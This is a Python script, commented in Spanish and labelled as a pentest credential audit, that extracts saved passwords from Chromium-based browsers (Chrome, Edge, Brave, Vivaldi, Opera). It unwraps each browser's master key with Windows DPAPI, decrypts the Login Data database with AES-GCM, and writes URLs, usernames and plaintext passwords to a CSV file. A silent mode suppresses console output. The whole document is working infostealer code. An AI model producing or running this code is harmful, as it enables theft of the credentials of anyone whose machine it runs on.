import os
import re
import sys
import json
import base64
import sqlite3
import shutil
import csv
import logging
import argparse
from pathlib import Path
from datetime import datetime

# Condicional para win32crypt (solo Windows)
try:
    import win32crypt
except ImportError:
    win32crypt = None

from Cryptodome.Cipher import AES

# Configuración de Logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("pentest_audit.log", encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

class ChromiumDecryptor:
    def __init__(self):
        self.local_appdata = Path(os.environ.get('LOCALAPPDATA', ''))
        self.roaming_appdata = Path(os.environ.get('APPDATA', ''))
        
        # Mapeo de rutas para navegadores basados en Chromium
        self.browsers = {
            "Chrome": self.local_appdata / "Google/Chrome/User Data",
            "Edge": self.local_appdata / "Microsoft/Edge/User Data",
            "Brave": self.local_appdata / "BraveSoftware/Brave-Browser/User Data",
            "Vivaldi": self.local_appdata / "Vivaldi/User Data",
            "Opera": self.roaming_appdata / "Opera Software/Opera Stable",
            "Opera GX": self.roaming_appdata / "Opera Software/Opera GX Stable"
        }

    def get_secret_key(self, browser_path):
        """Extrae la llave maestra de la configuración del navegador específico."""
        local_state_path = browser_path / "Local State"
        if not local_state_path.exists():
            return None

        try:
            with open(local_state_path, "r", encoding='utf-8') as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:] # Quitar prefijo DPAPI
            
            if win32crypt:
                secret_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                return secret_key
            else:
                return None
        except Exception as e:
            logger.debug(f"Error al obtener Master Key en {browser_path.name}: {e}")
            return None

    def decrypt_password(self, ciphertext, secret_key):
        """Descifra una contraseña individual usando AES-GCM."""
        try:
            iv = ciphertext[3:15]
            payload = ciphertext[15:-16]
            cipher = AES.new(secret_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload).decode()
            return decrypted_pass
        except Exception as e:
            return f"[ERROR: {str(e)}]"

    def audit(self, output_file="decrypted_passwords.csv", verbose=False):
        """Realiza la auditoría en todos los navegadores detectados."""
        total_extracted = 0
        
        with open(output_file, mode='w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(["Browser", "Profile", "URL", "Username", "Password"])

            for name, path in self.browsers.items():
                if not path.exists():
                    continue
                
                logger.info(f"Analizando navegador: {name}...")
                secret_key = self.get_secret_key(path)
                if not secret_key:
                    logger.warning(f"No se pudo obtener la llave maestra para {name}.")
                    continue

                # Encontrar perfiles (Chrome/Edge/Brave usan carpetas 'Default' o 'Profile X')
                # Opera suele guardar todo en la raíz de su carpeta de perfil
                profiles = [p for p in path.iterdir() if p.is_dir() and (p.name == "Default" or p.name.startswith("Profile"))]
                
                # Si no hay carpetas de perfil (caso Opera), probamos directamente en la raíz
                if not profiles:
                    profiles = [path]

                for profile_path in profiles:
                    login_db = profile_path / "Login Data"
                    if not login_db.exists():
                        continue

                    temp_db = Path("Loginvault_tmp.db")
                    try:
                        shutil.copy2(login_db, temp_db)
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        
                        found_count = 0
                        for url, user, ciphertext in cursor.fetchall():
                            if url and user and ciphertext:
                                password = self.decrypt_password(ciphertext, secret_key)
                                writer.writerow([name, profile_path.name, url, user, password])
                                found_count += 1
                                if verbose:
                                    logger.info(f"[{name} - {profile_path.name}] Capturado: {url}")

                        total_extracted += found_count
                        logger.info(f"[{name}] {profile_path.name}: {found_count} credenciales extraídas.")
                        cursor.close()
                        conn.close()
                    except Exception as e:
                        logger.error(f"Error procesando {name} ({profile_path.name}): {e}")
                    finally:
                        if temp_db.exists():
                            temp_db.unlink()

        logger.info(f"Auditoría finalizada. Total: {total_extracted} credenciales en {output_file}")

def main():
    parser = argparse.ArgumentParser(description="Auditoría de Credenciales Chromium - Suite Pentesting")
    parser.add_argument("-o", "--output", default="decrypted_passwords.csv", help="Nombre del archivo de salida (CSV)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Mostrar capturas en tiempo real en consola")
    parser.add_argument("--silent", action="store_true", help="No mostrar nada en consola (solo archivo log)")
    
    args = parser.parse_args()

    if args.silent:
        logger.handlers[1].setLevel(logging.CRITICAL)

    logger.info("Iniciando auditoría multi-navegador...")
    
    decryptor = ChromiumDecryptor()
    decryptor.audit(output_file=args.output, verbose=args.verbose)

if __name__ == "__main__":
    main()
